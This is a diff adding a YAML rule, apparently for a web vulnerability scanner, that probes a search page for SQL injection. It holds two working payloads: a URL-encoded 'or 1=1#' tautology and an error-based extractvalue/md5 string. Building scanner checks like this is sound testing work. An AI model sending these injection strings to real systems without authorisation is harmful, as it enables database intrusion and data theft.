@@ -1,0 +1,16 @@
+name: sqli_search
+rules:
+  - method: GET
+    path: /sqli/sqli_search.php
+    follow_redirects: false
+    body: name=%25%27+or+1%3D1%23&submit=搜索
+    expression: response.status==200 && lengthDiff && sqli_search
+  - method: GET
+    path: sqli_search.php
+    follow_redirects: false
+    body: name=1&submit=搜索
+    expression: response.status==200 && lengthDiff && sqli_search
+detail:
+  type: sqldet
+  paramkey: name
+  payload: admin'and/**/extractvalue(1,concat(char(126),md5(1840037928)))and'
